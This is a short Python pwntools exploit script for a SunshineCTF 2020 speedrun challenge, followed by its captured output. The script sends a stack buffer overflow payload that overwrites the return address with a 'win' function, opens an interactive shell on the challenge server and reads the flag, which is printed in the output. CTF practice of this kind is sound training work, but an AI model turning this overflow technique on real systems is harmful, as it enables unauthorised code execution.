from pwn import *

p = remote('chal.2020.sunshinectf.org', 30010)
#p = process('./chall_10')

e = ELF('./chall_10')

p.readline()

p.send('yolo\n')

line = b'a'*0x3a
line += p32(0xdeadbeef)
line += p32(e.symbols['win'])
line += p32(0xdeadbeef)
line += p32(0xdeadbeef)
line += p32(0xdeadbeef)
line += p32(0xdeadbeef)

input('...')
p.send(line + b'\n')

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30010: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_10'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
...
[*] Switching to interactive mode
$ ls
chall_10
flag.txt
$ cat flag.txt
sun{second-heartbeat-aeaff82332769d0f}
'''
